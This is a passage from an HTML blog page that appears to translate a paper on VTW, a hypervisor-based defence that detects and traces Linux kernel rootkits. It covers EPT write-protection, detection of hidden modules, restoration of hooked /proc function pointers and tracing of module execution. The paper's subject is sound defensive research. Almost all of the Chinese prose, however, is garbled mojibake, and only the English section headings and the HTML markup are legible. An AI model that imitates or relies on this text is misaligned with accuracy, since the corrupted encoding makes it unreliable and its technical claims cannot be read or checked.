æ®µæå–ä»¥è·å¾—ä»–ä»¬çš„çº¿æ€§åœ°å€ï¼Œå¹¶å°†å…¶ç¿»è¯‘ä¸ºç‰©ç†åœ°å€ã€‚</p><p>ä¹‹åï¼ŒVTW è®¾ç½®æ ‡è¯†è¿™äº›ç‰©ç†åœ°å€çš„ EPT æ¡ç›®ï¼ˆ$\zeta$ï¼‰çš„å†™æƒé™ä¸º â€œä¸å¯å†™â€ï¼ˆè¡¨4 ä¸­çš„ â‘£ ~ â‘¤ï¼‰ã€‚åœ¨ â€œguestâ€ æ¨¡å¼ä¸­ï¼Œå¯¹é™æ€å†…æ ¸å¯¹è±¡çš„å†™æ“ä½œï¼ˆ$WriteTo$ï¼‰å°†è§¦å‘ â€œEPT violationâ€ é€ æˆæ“ä½œç³»ç»Ÿé™·å…¥åˆ° â€œhostâ€ ï¼ˆâ€œRootkit æ”»å‡»æ£€æµ‹â€ ä¸­çš„ æ­¥éª¤ 1ï¼‰ã€‚æ¥ä¸‹æ¥ï¼ŒVTW æ³¨å…¥ä¸€ä¸ª #GP å¼‚å¸¸ï¼ˆ$InjectGP$ï¼‰ åˆ° â€œguestâ€ ä¸­ä»¥é¢„é˜² LKM æ‘§æ¯å†…æ ¸æ•°æ®ï¼ˆæ­¥éª¤ 2ï¼‰ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯æœ€å°çš„å†…å­˜ä¿æŠ¤ç²’åº¦ä¸ºä¸€å¼  â€œé¡µâ€ã€‚ç„¶è€Œå¹¶éæ‰€æœ‰çš„é™æ€å†…æ ¸å¯¹è±¡éƒ½å ç”¨å®Œæ•°ä¸ªé¡µï¼Œå› æ­¤å½“ä¸€ä¸ª â€œEPT æŸåâ€ å¼‚å¸¸è¢«æŠ›å‡ºï¼ŒVTW é¦–å…ˆç¡®è®¤å¼‚å¸¸åœ°å€æ˜¯å¦å±äºè¢«ä¿æŠ¤å¯¹è±¡çš„åœ°å€èŒƒå›´ã€‚</p><p>è‹¥æ˜¯ï¼Œåˆ™å½“å‰æ“ä½œä¼šè¢«é˜»å¡ï¼Œè‹¥å¦ï¼Œåˆ™ VTW å°†è®¾ç½® â€œguestâ€ ä¸ºå•æ­¥æ‰§è¡Œæ¨¡å¼ï¼ˆæ­¥éª¤4 ä¸­çš„ $SingleStep$ ï¼‰ã€‚æ¥ä¸‹æ¥å…¶å°†é¡µè®¾ç½®ä¸º â€œå¯å†™çš„â€ ï¼ˆæ­¥éª¤ 5ï¼‰ã€‚æœ€å VTW å°†æ“ä½œç³»ç»Ÿåˆ‡æ¢å› â€œguestâ€ æ¨¡å¼ä»¥å®Œæˆåç»­çš„å†™å…¥ã€‚åœ¨è¿™ä¹‹åï¼Œæ“ä½œç³»ç»Ÿé‡æ–°é™·å…¥ â€œhostâ€ï¼ŒVTW é€šè¿‡å‡½æ•° $OpenWrite$ å°†é¡µæ¢å¤åˆ° â€œä¸å¯å†™â€ ã€‚</p><h2 id="5-2-Dynamic-Kernel-Object-Protection"><a href="#5-2-Dynamic-Kernel-Object-Protection" class="headerlink" title="5.2 Dynamic Kernel Object Protection"></a>5.2 Dynamic Kernel Object Protection</h2><p>å†…æ ¸ rootkits å¯ä»¥é€šè¿‡ç¯¡æ”¹åŠ¨æ€å†…æ ¸æ•°æ®æ¥è¾¾æˆå¦‚åŠ«æŒæ§åˆ¶æµçš„æ¶æ„ç›®çš„ã€‚è¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®åŒ…æ‹¬æ§åˆ¶æ•°æ®ä¸éæ§åˆ¶æ•°æ®ï¼Œå‰è€…æŒ‡çš„æ˜¯æŒ‡å‘å†…æ ¸æ§åˆ¶æµçš„æŒ‡é’ˆã€‚</p><p>è¿™äº›æŒ‡é’ˆé€šå¸¸è¢«ç”¨äºæ„é€ è¯­ä¹‰è§†è§’ï¼Œä¾‹å¦‚å­˜å‚¨äº $â€procâ€$ æ–‡ä»¶ç³»ç»Ÿä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚åè€…åˆ™æŒ‡æŸäº›çŠ¶æ€æè¿°ç¬¦ä¸­çš„ä¸€äº›æ¡ç›®ï¼Œå¦‚ $â€struct moduleâ€$ ä¸­çš„æ¡ç›® $â€prevâ€$ ä¸ $â€nextâ€$ã€‚</p><p>å®æ—¶æ›´æ–°çš„å†…æ ¸æ•°æ®ä¸è¢« rootkits ç¯¡æ”¹çš„ç›®æ ‡æ•°æ®å¯èƒ½ä¼šå­˜æ”¾åœ¨åŒä¸€å¼ é¡µä¸­ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•é€šè¿‡é™åˆ¶å†…å­˜é¡µçš„å†™æƒé™æ¥é¢„é˜²å†…æ ¸ rootkits ç¯¡æ”¹å†…æ ¸æ•°æ®ã€‚</p><p>æ­¤å¤–ï¼Œæ”»å‡»æ—¶é—´çš„éšæœºæ€§ä½¿å¾—å®æ—¶æ£€æµ‹ç¯¡æ”¹æ“ä½œå˜å¾—å›°éš¾ã€‚é¢å¯¹è¿™äº›é—®é¢˜ï¼ŒVTW è·Ÿè¸ª LKMs çš„æ‰§è¡Œï¼Œå¹¶åœ¨ LKM è¿½è¸ªä¸­æ£€æµ‹åŠ¨æ€å†…æ ¸æ•°æ®ã€‚</p><h3 id="5-2-1-Hidden-Kernel-Detection"><a href="#5-2-1-Hidden-Kernel-Detection" class="headerlink" title="5.2.1 Hidden Kernel Detection"></a>5.2.1 Hidden Kernel Detection</h3><p>è‡ªæˆ‘éšè—æ˜¯å†…æ ¸ rootkit çš„åŸºæœ¬ç‰¹æ€§ï¼Œéšè—è¡Œä¸ºå¯ä»¥è¢«ä½œä¸ºåˆ¤æ–­ä¸€ä¸ª LKM æ˜¯å¦ä¸ºä¸€ä¸ª rootkit çš„æ ‡å‡†ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå†…æ ¸ rootkits åœ¨åˆå§‹åŒ–æ—¶å®ç°è‡ªæˆ‘éšè—ã€‚</p><p>å› æ­¤ï¼ŒVTW éœ€è¦åœ¨å…¶åˆå§‹åŒ–å®Œæˆä¹‹å‰æ£€æµ‹å…¶æ˜¯å¦è¢«éšè—ã€‚ä¸ºäº†è¿½è¸ªæ¨¡å—åˆå§‹åŒ–ï¼Œæˆ‘ä»¬åœ¨ $sys_init_module()$ è®¾ç½®äº†ä¸€ä¸ªæŒ‡ä»¤æ–­ç‚¹å¹¶ç›‘æ§ LKM çš„çŠ¶æ€æ”¹å˜ã€‚å½“çŠ¶æ€è¢«åˆ‡æ¢åˆ° $MODULE_STATE_LIVE$ æ—¶ï¼ŒVTW ä¼šæ£€æŸ¥æ¨¡å—æ˜¯å¦è¢«éšè—ã€‚å†…æ ¸ rootkits é€šè¿‡ä»é“¾è¡¨ä¸Šç§»é™¤ä»–ä»¬çš„çŠ¶æ€æè¿°ç¬¦æ¥ç ´åä¸å…¶ä»–å¯¹è±¡çš„é€»è¾‘è¿æ¥ä»¥è¿›è¡Œéšè—ï¼ŒLKMs ä¹‹é—´çš„é€»è¾‘è¿æ¥å¯ä»¥è¢«ç”¨æ¥ç¡®è®¤æ¨¡å—æ˜¯å¦è¢«éšè—ã€‚</p><p>$\mathscr{M}$c ä¸º LKM æ­£åœ¨è¢«è£…è½½ï¼Œ$\mathscr{M}$p ä¸ºè¢«$\mathscr{M}$c ä¸­çš„æ¡ç›® $prev$ æŒ‡å‘çš„æ¨¡å—ï¼Œ$\mathscr{M}$n ä¸ºè¢« $\mathscr{M}$c ä¸­æ¡ç›® $next$ æ‰€æŒ‡å‘çš„æ¨¡å—ï¼ˆè¡¨4 ä¸­çš„ â‘¦~â‘§ï¼‰ã€‚è‹¥æ¨¡å— $\mathscr{M}$c ä¸å…¶ç›¸é‚»èŠ‚ç‚¹å¹¶ä¸å­˜åœ¨é“¾è¡¨è¿æ¥å…³ç³»ï¼ˆâ€œRootkit æ”»å‡»æ£€æµ‹â€ ä¸­çš„æ­¥éª¤ 6 ï¼‰ï¼Œæˆ–è¿æ¥å…³ç³»ä¸å®Œæ•´ï¼ˆæ­¥éª¤ 7 ~ 8ï¼‰ï¼Œåˆ™æˆ‘ä»¬åˆ¤æ–­ æ¨¡å— $\mathscr{M}$c è¢«éšè—äº†ã€‚</p><h3 id="5-2-2-Dynamic-Kernel-Data-Detection"><a href="#5-2-2-Dynamic-Kernel-Data-Detection" class="headerlink" title="5.2.2 Dynamic Kernel Data Detection"></a>5.2.2 Dynamic Kernel Data Detection</h3><p>é™¤äº†çŠ¶æ€æè¿°ç¬¦å¤–ï¼Œå†…æ ¸ rootkits è¿˜ä¼šç¯¡æ”¹å¸¦æœ‰æ§åˆ¶å±æ€§çš„å†…æ ¸æ•°æ®ä»¥è¿›è¡Œå†…æ ¸æ§åˆ¶æµé‡å®šå‘ã€‚åœ¨é‡å®šå‘å‰è¿™ç±»å†…æ ¸æ•°æ®åˆæŒ‡å‘å†…æ ¸ä»£ç æ®µçš„æŒ‡é’ˆç»„æˆï¼Œå†…æ ¸ rootkits é‡å†™æŒ‡é’ˆä»¥é‡å®šå‘åˆ°ä»–ä»¬çš„è‡ªå®šä¹‰ä»£ç ã€‚</p><p>è¢«é‡å®šå‘çš„å¯¹è±¡ä¸»è¦åŒ…æ‹¬å¤šç§ç”¨äºæ„å»ºæ“ä½œç³»ç»Ÿè¯­ä¹‰è§†è§’çš„æ“ä½œå‡½æ•°ã€‚$â€procâ€$ æ–‡ä»¶ç³»ç»Ÿä¸­çš„å‡½æ•°æŒ‡é’ˆï¼ˆä¾‹å¦‚ $lookup$ï¼‰å¯¹å†…æ ¸ rootkits è€Œè¨€ä¸ºæœ€è„†å¼±çš„å¯¹è±¡ï¼Œå› æ­¤æœ‰å¿…è¦ä¿æŠ¤è¿™äº›å‡½æ•°æŒ‡é’ˆä¸è¢«ç¯¡æ”¹ã€‚</p><p>ä¸ºäº†éšè—ç½‘ç»œè¿æ¥ï¼ˆä¾‹å¦‚ç½‘ç»œç«¯å£ï¼‰ï¼Œå†…æ ¸ rootkits è¿˜ä¼šæ”»å‡»  $â€&#x2F;proc&#x2F;net&#x2F;tcpâ€$ã€$â€&#x2F;proc&#x2F;net&#x2F;tcp6â€$ ã€$â€&#x2F;proc&#x2F;net&#x2F;udpâ€$ ã€$â€&#x2F;proc&#x2F;net&#x2F;udp6â€$ ä¸­çš„æ•°æ®ï¼Œå› æ­¤è¿™äº›æ–‡ä»¶æè¿°ç¬¦ä¸­çš„å‡½æ•°æŒ‡é’ˆåŒæ ·éœ€è¦è¢«ä¿æŠ¤ã€‚</p><p>é™¤äº†ä¸Šè¿°å†…æ ¸å¯¹è±¡ï¼ŒVTW è¿˜è¦å°†å¦‚ $â€rootâ€$ ä¸ $â€logâ€$ è¿™æ ·å…³é”®æ–‡ä»¶çš„å‡½æ•°æŒ‡é’ˆä½œä¸ºä¿æŠ¤å¯¹è±¡ã€‚æ‰€æœ‰çš„å‡½æ•°æŒ‡é’ˆä¸ä»–ä»¬çš„å­˜å‚¨åœ°å€å¯ä»¥åœ¨ VTW åˆå§‹åŒ–ä¸­é€šè¿‡ç‰¹å®šçš„æ•°æ®ç»“æ„ï¼ˆå¦‚ $f_dentry-&gt;d_inode-&gt;i_op-&gt;lookup$ï¼‰ä»å†…å­˜ä¸­æå–ã€‚</p><p>æ‰€æœ‰è¢«æå–çš„æ•°æ®å½¢æˆä¸€ä¸ªé›†åˆ $k$ ï¼Œ$k$ ä¸­æ‰€æœ‰çš„åŠ¨æ€å†…æ ¸æ•°æ®æŒ‡å‘å›ºå®šçš„å†…æ ¸å‡½æ•°ä¸”ä¸éœ€è¦è¢«æ›´æ–°ã€‚ä»…å½“æˆ‘ä»¬å‘ç°ä¸€ä¸ªæ–°çš„å†…æ ¸ rootkit ä¿®æ”¹ä¸€ä¸ªä¸åœ¨ $k$ ä¸­çš„æŸäº›å†…æ ¸æ•°æ®æ—¶æˆ‘ä»¬æ‰æ‰©å±• $k$ã€‚æ­¤å¤–ï¼ŒVTW é€šè¿‡ EPT å°† $k$ è®¾ç½®ä¸ºè¯»å†™ä¿æŠ¤ï¼Œå¹¶ç¦æ­¢ â€œguestâ€ ä¸­çš„æ‰§è¡Œå®ä½“è®¿é—® $k$ ä»¥ä¿æŠ¤ä»–ã€‚</p><p>ç°åœ¨ $k$ å ç”¨å¤§æ¦‚ 64KB çš„å†…å­˜ä¸”åŒ…å« 4000 ä»½å†…æ ¸æ•°æ®ï¼Œå…¶å°†æ ¹æ®æ–° rootkits çš„çªå‘æƒ…å†µè€Œå¢é•¿ã€‚åœ¨å®æˆ˜ä¸­ï¼Œç°æœ‰çš„å†…æ ¸ rootkits é€šå¸¸ä¿®æ”¹ä¸è¶…è¿‡ 500 ä»½å†…æ ¸æ•°æ®ã€‚æˆ‘ä»¬å°†èŒƒå›´æ‰©å¤§ä»¥è¿›è¡Œæ›´å¥½çš„ä¿æŠ¤ã€‚</p><p>$k$ ä¸­çš„æ¯ä¸ªå…ƒç´  $D$ å¯¹åº”ä¸€ä¸ªç‹¬ç‰¹çš„å†…æ ¸å¯¹è±¡ï¼ˆè¡¨ 4 ä¸­çš„ â‘¨ï¼‰ã€‚å…ƒç´  $D$i ä½œä¸ºäºŒå…ƒæ•°æ®å¯¹ ï¼ˆ$a$iï¼Œ$c$iï¼‰å­˜åœ¨ï¼Œ$a$i è¡¨ç¤ºè¢«ä¿æŠ¤çš„æ•°æ®çš„åœ°å€ï¼Œ$c$i åˆ™è¡¨ç¤ºæ•°æ®å†…å®¹ï¼ˆâ‘©ï¼‰ã€‚X ä¸ºå†…æ ¸ä»£ç èŒƒå›´$s \sim _\mathscr{e}$ ï¼ˆâ‘ªï¼‰çš„èŒƒå›´ã€‚</p><p>åœ¨ LKM çš„æ‰§è¡Œä¸­ï¼ŒVTW ä¼šæ£€æµ‹åœ°å€ $a$i ä¸Šçš„å†…æ ¸æ•°æ® $c$i$â€™$ æ˜¯å¦æŒ‡å‘å†…æ ¸ä»£ç æ®µï¼ˆâ‘«ï¼‰ã€‚è‹¥å­˜åœ¨ $c$i å¹¶ä¸æŒ‡å‘å†…æ ¸ä»£ç æ®µï¼Œåˆ™å…¶å¯ä»¥ç¡®è®¤å†…æ ¸æ§åˆ¶æµè¢«é‡å®šå‘äº†ï¼ˆâ€œRootkit æ”»å‡»æ£€æµ‹â€ ä¸­çš„ 10ï¼‰ã€‚åœ¨æ£€æµ‹åˆ°è¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ® $c$i$â€™$ åï¼ŒVTW è¯»å–åœ¨ $D$i ä¸­ä¿å­˜çš„  $c$i å¹¶å°†å…¶å†™å…¥åˆ° $D$i.$a$i ï¼ˆæ­¥éª¤ 11ï¼‰ã€‚ä¹‹åè¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®æ¢å¤åˆ°äº†å…¶åˆå§‹å€¼ã€‚</p><p>ä¸å†…æ ¸ rootkits ä¸åŒï¼Œåˆæ³•çš„ LKMs ä¸ä¼šä¿®æ”¹çŠ¶æ€æè¿°ç¬¦ä»¥è¿›è¡Œè‡ªæˆ‘éšè—ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹å¸¦æœ‰ç³»ç»Ÿå‡½æ•°æŒ‡å‘ç‰¹æ€§çš„æ‰©å±•æ•°æ®ä»¥è¿›è¡Œæ§åˆ¶æµé‡å®šå‘ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬ä¿æŠ¤åŠ¨æ€å†…æ ¸æ•°æ®çš„æ–¹æ³•ä¸ºåœ¨ LKM æ‰§è¡Œçš„ç‰¹å®šé˜¶æ®µæ£€æŸ¥è¢«ä¿æŠ¤æ•°æ®çš„å®Œæ•´æ€§ï¼ˆä¾‹å¦‚è°ƒåº¦ä¸è·³è½¬ï¼‰ï¼Œè€Œéé™åˆ¶æ‰€æœ‰æ‰§è¡Œå®ä½“å¯¹å±äºå†…æ ¸æ•°æ®çš„æ•°æ®ç»“æ„çš„è®¿é—®ã€‚ç»“æœä¾¿æ˜¯ VTW å¯ä»¥ä»æ‰€æœ‰çš„ LKMs ä¸­è¯†åˆ«å‡º rootkits ä¸”ä¸ä¼šå½±å“åˆ°å…¶ä»– LKMs çš„æ‰§è¡Œã€‚</p><h2 id="5-3-Bypassing-Resistance-of-VTW-Effects"><a href="#5-3-Bypassing-Resistance-of-VTW-Effects" class="headerlink" title="5.3 Bypassing Resistance of VTW Effects"></a>5.3 Bypassing Resistance of VTW Effects</h2><p>ä»¥ VTW çš„åŠ è½½æ—¶é—´ä½œä¸ºåˆ†ç•Œç‚¹ï¼ŒLKMs å¯ä»¥è¢«åˆ†ä¸ºå·²è¢«è£…è½½çš„ LKMs ä¸æœªè¢«è£…è½½çš„ LKMsã€‚å½“ VTW è¢«æˆåŠŸåŠ è½½åï¼Œå…¶å¯ä»¥åŠæ—¶ç›‘æ§å¹¶æ§åˆ¶æ‰€æœ‰æœªè¢«è£…è½½çš„ LKMs çš„è£…è½½ä¸æ‰§è¡Œï¼Œä½¿å…¶æ— æ³•ç»•è¿‡æ£€æµ‹ã€‚</p><p>å¯¹äºåœ¨ VTW è½½å…¥å‰è¢«è£…è½½çš„ LKMsï¼ŒVTW æ— æ³•åœ¨ â€œhostâ€ æ¨¡å¼ä¸‹å¸¸è§„åœ°æ£€æµ‹ä¸è·Ÿè¸ªï¼Œå› ä¸ºè¿™ä¼šæé«˜ç»•è¿‡ VTW çš„é£é™©ã€‚</p><p>æœ‰ä¸¤ä¸ªè§£å†³è¯¥é—®é¢˜çš„æ–¹æ³•ã€‚å…¶ä¸€æ˜¯å°† VTW è®¾ä¸ºå¼€æœºæ—¶å¯åŠ¨ï¼Œè¿™æ ·ç»å¤§éƒ¨åˆ†çš„ LKMs éƒ½ä¼šè¢«åŒ…å«åœ¨ç›‘æ§èŒƒå›´å†…ï¼Œç„¶è€Œè¿™ç§åŠæ³•å¯¹äºé‚£äº›åŒæ ·åœ¨å¼€æœºæ—¶å¯åŠ¨çš„ LKMs è€Œè¨€ä»æ˜¯æ— æ•ˆçš„ã€‚</p><p>ç¬¬äºŒç§æ–¹æ³•ä¾¿æ˜¯ä½¿ç”¨å†…æ ¸å®Œæ•´æ€§æ£€æŸ¥çš„åŠæ³•æ¥å®šä½æœ‰å®³çš„ LKMã€‚è¢«é‡å®šå‘çš„æ§åˆ¶æµå±äº rootkitsï¼Œå¯ä»¥é€šè¿‡å°† LKM åˆ—è¡¨ä¸­çš„æ§åˆ¶æµåœ°å€ï¼ˆ$mal_addr$ï¼‰ä¸æ¯ä¸ªä»£ç æ®µï¼ˆ$module-&gt;core,module-&gt;core+module-&gt;core_size$ï¼‰è¿›è¡Œé…å¯¹ä»¥ç¡®å®š rootkit æ˜¯å¦å·²è¢«éšè—ã€‚è‹¥æ˜¯ï¼Œ$mal_addr$ å°†è¢«ä½œä¸ºå®šä½éšè— LKM çš„èµ·å§‹ç‚¹ã€‚è¿‡ç¨‹å¦‚ å›¾.4 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/08/ZY8sMaE7ehj2BSH.png" alt="å›¾.4 å®šä½éšè—çš„â€œstruct moduleâ€"></p><p>LKM çš„ä»£ç æ®µä¸æ•°æ®æ®µåœ¨è™šæ‹Ÿç©ºé—´ä¸­æ˜¯è¿ç»­çš„ï¼Œä»–ä»¬çš„æœ€åä¸€çº§é¡µè¡¨é¡¹æ˜¯ç›¸é‚»çš„ã€‚å› æ­¤ï¼Œé€šè¿‡ä½¿ç”¨ä»–ä»¬ä¹‹é—´ä¸åŒçš„å¯æ‰§è¡Œæ€§ï¼ˆæœ€åä¸€çº§é¡µè¡¨é¡¹çš„ NX ä½ï¼‰ï¼Œä»£ç æ®µçš„æœ«å°¾åœ°å€ï¼ˆ$code_end$ï¼‰ä¸æ•°æ®æ®µçš„èµ·å§‹åœ°å€ï¼ˆ$data_start$ï¼‰å¯ä»¥è¢«è¯†åˆ«ã€‚</p><p>åœ¨è¿™ä¹‹åï¼Œæˆ‘ä»¬ä½¿ç”¨æ•°æ®æ®µçš„è¯»å†™æƒé™ï¼ˆæœ€åä¸€çº§é¡µè¡¨é¡¹çš„ RW ä½ï¼‰æ¥è·å¾—å¯å†™æ•°æ®æ®µçš„èµ·å§‹åœ°å€ï¼ˆ$writable_data_start$ï¼‰ã€‚LKM çš„çŠ¶æ€æè¿°ç¬¦ï¼ˆ$struct\ module$ï¼‰ä¾¿å­˜æ”¾åœ¨å¯å†™æ•°æ®æ®µä¸­ã€‚</p><p>æ ¹æ® LKM ä»£ç æ®µæŒ‰é¡µå¯¹é½çš„ç‰¹æ€§ï¼Œä»£ç æ®µçš„èµ·å§‹åœ°å€ä¸º $data_start$-$N * page_size$ ï¼Œå…¶å€¼ä¸º $module-&gt;module_core$ã€‚ä» $writable_data_start$ å¼€å§‹ï¼Œæˆ‘ä»¬å‡è®¾æ¯ä¸ªå­—èŠ‚çš„èµ·å§‹åœ°å€ä¾¿æ˜¯ LKM ä»£ç çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åŸºäº $module-&gt;module_core$ ä¸ $module-&gt;core_text_size$ é—´çš„ç›¸å¯¹ä½ç§»è®¡ç®— $module-&gt;core_text_size$ çš„åœ°å€ï¼Œå¯¹  $module-&gt;module_core$ ä¸ $module-&gt;core_text_size$  çš„æ­£ç¡®è¡¨ç¤ºä¸ºæœ€å 12 ä½éƒ½ä¸º0ã€ä¸¤è€…æ€»å’Œä½ $data_start$ã€‚</p><p>ä¹‹åæˆ‘ä»¬ä»¥ä¸€ä¸ªå•å­—èŠ‚ä½œä¸ºæ­¥é•¿æ£€æŸ¥æ‰€æœ‰åœ¨ $writable_data_start$ ä¹‹åçš„å†…å­˜ï¼Œç›´åˆ°æˆ‘ä»¬è·å¾—åˆé€‚çš„ $module-&gt;module_core$ ä¸ $module-&gt;core_text_size$ ã€‚æœ€åï¼Œmodule ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªåœ°å€ä½¿ç”¨ä¸ $struct\ module$ ç›¸å…³çš„ $module-&gt;module_core$ çš„åç§»è¿›è¡Œè®¡ç®—ã€‚ç›¸æ¯”äºç¬¬ä¸€ç§æ–¹æ³•ï¼Œè¿™ç§æ–¹æ³•æœ‰ç€æ›´å¤§çš„èŒƒå›´ï¼Œä½†å®ç°è¿‡ç¨‹ç›¸å¯¹æ›´åŠ å¤æ‚ã€‚ VTW åŒæ—¶ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ¥è¾¾æˆæœ€ä½³çš„é˜²æŠ¤æ•ˆæœã€‚</p><h1 id="6-Rootkit-Tracing-Process"><a href="#6-Rootkit-Tracing-Process" class="headerlink" title="6 Rootkit Tracing Process"></a>6 Rootkit Tracing Process</h1><p>å†…æ ¸ rootkit å¯èƒ½åœ¨ LKM æ­£åœ¨åŠ è½½æ—¶æˆ–å·²è¢«åŠ è½½åå‘åŠ¨æ”»å‡»ï¼Œå•æ¬¡æ”»å‡»çš„å‚ä¸è€…å¯èƒ½æ˜¯å•ä¸ªæˆ–å¤šä¸ªæ¨¡å—ã€‚</p><p>æˆ‘ä»¬å°†ä¿®æ”¹å†…æ ¸æ•°æ®çš„ç›´æ¥å‘èµ·è€…ä½œä¸ºè¡Œä¸ºè½½ä½“ï¼Œæ”»å‡»çš„æœ€åˆå‘èµ·è€…ç§°ä¸ºåŠ¨ä½œè½½ä½“ï¼Œå…¶ä»£ç æ›¿æ¢äº†åŸå§‹å†…æ ¸å‡½æ•°çš„ LKM ç§°ä¸ºå‡½æ•°è½½ä½“ã€‚</p><p>ä¸ºäº†è¿½è¸ªæ‰€æœ‰å‚ä¸äº†ä¸€æ¬¡æ”»å‡»çš„å†…æ ¸ rootkitsï¼ŒVTW å¸¦æ¥äº†ä¸¤ç§æ–°çš„æ–¹æ³•ï¼šâ€œè·Ÿè¸ªæ­¤å‰ä¸æ­¤åçš„ rootkit æ”»å‡»â€ ä¸ â€œæ”»å‡»å›æ”¾ç¨‹åºâ€ï¼Œè¿™äº›æ–¹æ³•æ‰€éœ€çš„æ¡ä»¶å¦‚ è¡¨5 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/09/mnQvHSb8W5ANkg4.png" alt="image.png"></p><p>å…¶ä»–å‚ä¸äº†æ”»å‡»çš„ LKMs è¢«ç§°ä¸ºè¿‡ç¨‹è½½ä½“ã€‚è¿™äº›è½½ä½“ä¹‹é—´å¯èƒ½å­˜åœ¨é‡å ï¼Œä¾‹å¦‚æ­£åœ¨è¢«è£…è½½çš„ LKM å¯ä»¥é‡å®šå‘å†…æ ¸æ§åˆ¶æµåˆ°å¯¼å‡ºå‡½æ•°ï¼Œåœ¨è¿™æ¬¡æ”»å‡»è®¾æƒ³ä¸­ï¼ŒLKM åŒæ—¶å±äºåŠ¨ä½œè½½ä½“ä¸è¡Œä¸ºè½½ä½“ï¼Œè¢«è£…è½½çš„ LKM å±äºå‡½æ•°è½½ä½“ï¼Œä¸å­˜åœ¨è¿‡ç¨‹è½½ä½“ã€‚</p><p>æ‰€æœ‰è¢«ç›‘æ§çš„ LKMs å½¢æˆäº†å…ƒç»„ $T$ ï¼Œæ‰€æœ‰å‚ä¸äº†åŒä¸€äº‹ä»¶çš„ LKMs å½¢æˆäº†å…ƒç»„ $\mathscr{R}$ ï¼ˆè¡¨5 ä¸­çš„â‘ ï¼‰ã€‚å½“ä¸€ä¸ª LKM æ­£åœ¨è¿è¡Œï¼Œæˆ‘ä»¬å¼€å¯å…¶æ‰§è¡Œæƒé™ï¼ŒåŒæ—¶é™¤äº†åœ¨å…¶ä»– CPU æ ¸å¿ƒä¸Šæ­£åœ¨è¿è¡Œçš„ LKMs ä»¥å¤–ï¼Œå…¶ä»–æ‰€æœ‰ LKMs çš„æ‰§è¡Œæƒé™éƒ½è¢«å…³é—­ï¼ˆâ‘¡ï¼‰ã€‚æ‰€æœ‰è¿è¡Œåœ¨ä¸åŒæ ¸å¿ƒä¸Šçš„ LKMs å½¢æˆä¸€ä¸ªå…ƒç»„ $\mathscr{F}$ ï¼ˆè¡¨5 ä¸­çš„ â‘¢ï¼‰ã€‚è¦è¢«è°ƒåº¦ä»¥æ‰§è¡Œçš„ LKM ï¼ˆ$\mathscr{F}$jï¼‰ä¸ç¬¬ k ä¸ª CPU æ ¸å¿ƒå…³è”ï¼ˆâ‘£ï¼‰ï¼ŒLKM æ‰€å±çš„å†…å­˜è¢«è®°å½•ä¸º $\alpha$ ï¼ˆâ‘¤ï¼‰ã€‚</p><h2 id="6-1-Trace-LKM-Execution-Events"><a href="#6-1-Trace-LKM-Execution-Events" class="headerlink" title="6.1 Trace LKM Execution Events"></a>6.1 Trace LKM Execution Events</h2><p>æœ‰ä¸‰ç§æ‰§è¡Œ rootkit çš„æ–¹å¼ï¼Œç¬¬ä¸€ç§ä¸º LKM åœ¨æ¨¡å—åŠ è½½æ—¶è°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ”»å‡»å¯èƒ½åœ¨åŠ è½½å®Œæˆå‰è¢«å¯åŠ¨ã€‚</p><p>ç¬¬äºŒç§ä¸º LKM åœ¨å®Œæˆè½½å…¥ä¹‹åå…¶å¯¼å‡ºå‡½æ•°è¢«å…¶ä»–æ¨¡å—è°ƒç”¨ï¼Œè¢«åŠ è½½çš„ LKM å¯ä»¥è¢«è°ƒç”¨ä»¥ä¿®æ”¹å†…æ ¸æ•°æ®ï¼Œæˆ–æ˜¯è¢«ç”¨ä½œå‡½æ•°è½½ä½“æ¥æ›¿æ¢å†…æ ¸çš„åŸå§‹å‡½æ•°ã€‚</p><p>ç¬¬ä¸‰ç§ä¸º LKM è¢«é€šè¿‡åˆ›å»ºä¸€ä¸ªå†…æ ¸çº¿ç¨‹è€Œæ‰§è¡Œï¼Œæ”»å‡»å¯ä»¥åœ¨çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸçš„ä»»æ„æ—¶é—´è¢«è§¦å‘ã€‚</p><p>ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»å¯èƒ½åŒ…æ‹¬ä¸€ç§æˆ–å¤šç§ä¸Šè¿°çš„æ‰§è¡Œã€‚ä¸ºäº†ç›‘æ§ LKM çš„æ‰§è¡Œï¼ŒVTW è®¾ç½®äº†ç›®æ ‡å·²è¢«è£…è½½ LKMs ä¸ºä¸å¯æ‰§è¡Œã€‚</p><p>ç„¶è€Œç”±äºå¤§é‡çš„å†…å­˜è®¾ç½®æ“ä½œï¼Œè¿™ç§åŠæ³•æ˜¯ä½æ•ˆçš„ã€‚ä»¥ä¸€ä¸ªæœ‰ç€ 4MB ä»£ç æ®µçš„ LKM ä¸ºä¾‹ï¼ŒVTW å¿…é¡»è¦æ“ä½œ EPT é¡µè¡¨å¤šä½™ 2000 æ¬¡ä»¥å®Œæˆä¸€æ¬¡æ‰§è¡Œæƒé™çš„å¼€å¯ä¸å…³é—­ã€‚ä¸ºäº†å‡å°‘é¡µè¡¨è®¾ç½®æ“ä½œçš„æ•°é‡ï¼ŒVTW å»ºç«‹äº†ä¸€ç§æœºåˆ¶æ¥ç®¡ç† LKM çš„æ‰§è¡Œæƒé™ï¼Œå¦‚ å›¾.5 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/09/WcROlmhj4Yix2Aw.png" alt="å›¾.5 é¡µè¡¨é‡å®šå‘æœºåˆ¶"></p><p>VTW é¦–å…ˆé€šè¿‡ $â€struct \ moduleâ€$ è·å¾— LKM ä»£ç 